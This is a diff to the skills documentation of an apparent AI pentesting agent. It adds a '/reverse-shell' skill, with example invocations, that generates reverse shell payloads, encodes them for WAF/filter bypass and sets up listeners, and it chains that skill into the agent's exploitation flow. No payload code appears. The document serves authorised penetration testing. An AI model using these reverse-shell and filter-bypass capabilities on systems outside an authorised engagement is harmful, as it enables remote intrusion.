@@ -390,6 +390,28 @@ docker build -t pentest-agent/metasploit ./tools/metasploit/
 
 ---
 
+## `/reverse-shell`
+
+Reverse shell payload generation and listener management. Generates platform-specific payloads and sets up listeners in the Kali container.
+
+```
+/reverse-shell 10.0.0.5 lhost=10.0.0.1 lport=4444 type=bash
+/reverse-shell 10.0.0.10 type=powershell encode=base64
+/reverse-shell 10.0.0.5 type=msfvenom
+```
+
+**What it does:**
+
+1. **Payload generation** — bash, python, php, perl, ruby, netcat, socat, powershell, awk, msfvenom (ELF, EXE, WAR, JSP, PHP, ASP)
+2. **Encoding** — base64, URL-encode, hex for WAF/filter bypass
+3. **Listener setup** — ncat, socat, Meterpreter multi/handler, encrypted (OpenSSL)
+4. **Shell stabilization** — python pty.spawn, script, socat TTY upgrade
+5. **Decision tree** — selects payload based on target OS and available interpreters
+
+No new tools needed — uses ncat, socat, msfvenom, openssl already in Kali.
+
+---
+
 ## Chaining skills
 
 Skills are designed to be chained automatically during an engagement:
@@ -402,6 +424,7 @@ Before a pentest
 During a pentest (/pentester)
   ├── /analyze-cve            if nuclei or semgrep finds a CVE dependency
   ├── /metasploit             if exploitable CVE confirmed — validate with Metasploit modules
+  ├── /reverse-shell          exploit needs a callback — payload generation + listener setup
   ├── /ssl-tls-audit          if TLS services are found — PCI DSS/NIST compliance audit
   ├── /network-assess         if internal network scope — segmentation, SNMP, broadcast protocols
   ├── /credential-audit       weak auth found — brute-force, spraying, default credentials
